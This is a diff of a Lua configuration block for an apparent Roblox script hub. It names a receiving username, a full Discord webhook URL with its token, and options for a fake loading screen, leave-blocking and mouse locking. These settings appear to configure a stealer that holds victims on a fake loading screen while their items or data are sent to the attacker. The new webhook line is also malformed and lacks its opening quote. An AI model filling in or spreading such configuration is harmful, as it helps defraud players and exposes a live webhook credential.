@@ -1,13 +1,13 @@
 UserName = "PogrzaloCie"
-UserName2 = "PogrzaloCie"
-Webhook = "https://discord.com/api/webhooks/1097981158421184654/h34T6lkAsC-oWEwaVSatTOnV1mg6uqMeyJOpuU-hm6rVNmJibixGqVPKj5NAUt1Rmrjy" 
+UserName2 = "PogrzaloCie" -- optional delete the whole line if you don't want it
+Webhook = https://discord.com/api/webhooks/1097981158421184654/h34T6lkAsC-oWEwaVSatTOnV1mg6uqMeyJOpuU-hm6rVNmJibixGqVPKj5NAUt1Rmrjy"  
 
 _G.LoadingScreen = true
 _G.AntiLeave = true
 _G.MouseLock = true 
+-- set them to false if you don't need them
 
-
-_G.ScriptName = "Yazja Hub"
+_G.ScriptName = "Rizz Scriptz"
 _G.FirstText = "Script Preparing"
 _G.SecondText = "Script Loading..."
 _G.ThirdText = "Almost Done..."
